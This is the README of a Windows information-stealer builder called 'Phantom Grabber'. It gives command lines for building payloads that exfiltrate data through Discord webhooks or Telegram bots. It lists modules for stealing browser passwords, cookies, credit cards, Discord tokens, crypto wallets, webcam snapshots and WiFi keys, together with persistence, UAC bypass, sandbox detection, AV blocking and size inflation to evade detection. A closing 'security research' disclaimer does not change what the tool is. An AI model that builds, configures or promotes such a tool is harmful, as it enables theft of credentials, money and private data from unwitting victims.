# Phantom Grabber

> 2026 Edition — Advanced information gathering tool for security research.

## Requirements

- **Python 3.10+** (Windows 10/11 only)
- Dependencies installed via `Builder.bat` or manually:
  ```
  pip install customtkinter pillow pyaes urllib3 pycryptodome
  ```

## Usage

### GUI Builder
```
Builder.bat
```
Double-click or run from terminal. Checks Python, installs missing libraries, launches the CustomTkinter GUI.

### CLI Builder
```bash
# Discord webhook
python build.py --webhook https://discord.com/api/webhooks/xxx --startup --melt

# Telegram
python build.py --telegram BOT_TOKEN$CHAT_ID --vm-protect --uac-bypass

# Selective modules
python build.py --webhook URL --no-webcam --no-games --no-wifi

# Python output instead of EXE
python build.py --webhook URL --output py

# Kitchen sink
python build.py --webhook URL --startup --melt --uac-bypass --vm-protect --ping --block-av --discord-injection --pump 10 --fake-error "Update" "Restart required" 2 --console debug
```

## Modules

| Module | Flag to Disable | Description |
|--------|----------------|-------------|
| Passwords | `--no-passwords` | Browser saved passwords (Chromium + Gecko) |
| Cookies | `--no-cookies` | Browser cookies |
| History | `--no-history` | Browser history |
| Autofills | `--no-autofills` | Browser autofill data |
| Discord Tokens | `--no-discord-tokens` | Discord authentication tokens |
| Games | `--no-games` | Steam, Epic, Minecraft sessions |
| WiFi | `--no-wifi` | Saved WiFi passwords |
| System Info | `--no-systeminfo` | Hardware, OS, network info |
| Screenshot | `--no-screenshot` | Desktop screenshot |
| Webcam | `--no-webcam` | Webcam snapshot |
| Telegram | `--no-telegram` | Telegram session files |
| Common Files | `--no-common-files` | Documents, images from common paths |
| Wallets | `--no-wallets` | Cryptocurrency wallets |
| EXIF Data | `--no-exif` | Photo EXIF metadata extraction |
| Credit Cards | `--no-credit-cards` | Browser saved payment methods |

## Features

- **C2 Modes**: Discord Webhook or Telegram Bot
- **Persistence**: Startup registry, melt-after-run
- **Protection**: UAC bypass, VM/sandbox detection
- **Stealth**: Fake error popups, console hiding, AV site blocking
- **Binding**: Attach to legitimate executables
- **Injection**: Discord client token logging injection
- **Output**: Compiled EXE (PyInstaller) or standalone Python script
- **Pump**: Inflate stub size to evade size-based heuristics

## Project Structure

```
phantom_grabber/
├── build.py              # CLI builder
├── gui.py                # GUI builder (CustomTkinter)
├── Builder.bat           # One-click launcher
├── Components/
│   ├── config.json       # Build configuration
│   ├── process.py        # Build pipeline
│   ├── requirements.txt  # Python deps
│   ├── version.txt       # PE version info
│   └── stub/             # Stub modules
├── Extras/
│   └── hash              # Build identifier
└── README.md
```

## Disclaimer

This project is intended for **authorized security research and educational purposes only**. Unauthorized use against systems you do not own or have explicit permission to test is illegal. The authors assume no liability for misuse.
